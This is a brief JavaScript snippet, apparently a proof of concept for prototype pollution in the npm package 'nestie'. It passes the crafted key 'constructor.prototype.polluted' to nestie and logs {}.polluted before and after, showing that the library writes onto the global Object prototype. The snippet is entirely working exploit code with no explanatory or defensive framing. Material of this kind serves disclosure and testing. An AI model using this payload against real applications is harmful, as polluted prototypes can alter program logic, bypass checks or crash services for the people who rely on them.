var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);